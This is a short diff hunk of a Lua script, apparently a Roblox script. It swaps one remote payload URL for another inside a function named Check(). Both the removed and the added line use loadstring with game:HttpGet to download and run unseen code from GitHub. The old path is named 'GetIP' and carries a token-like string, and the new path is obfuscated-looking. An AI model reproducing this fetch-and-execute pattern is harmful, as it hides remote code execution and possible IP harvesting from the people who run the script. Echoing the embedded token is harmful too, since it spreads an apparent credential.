@@ -3675,7 +3675,7 @@ function MainScript()
 end
 
 function Check()
-	loadstring(game:HttpGet("https://raw.githubusercontent.com/ZoDuxDev/Private/main/GetIP?token=GHSAT0AAAAAABU2ZBU4KVZI5JVDND3BQCTYYULLTSA"))()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/EchoDevLight/GEtttttttttttttdzgagagagagagagadbdbf/main/thisissssisSOOOTTUpooidbruhamongusImposrsteren.E(SZDoProlua"))()
 	
 	local MakePrompt = require(game.ReplicatedStorage.Modules.Client_Function_Bank)
 	local Table = {}
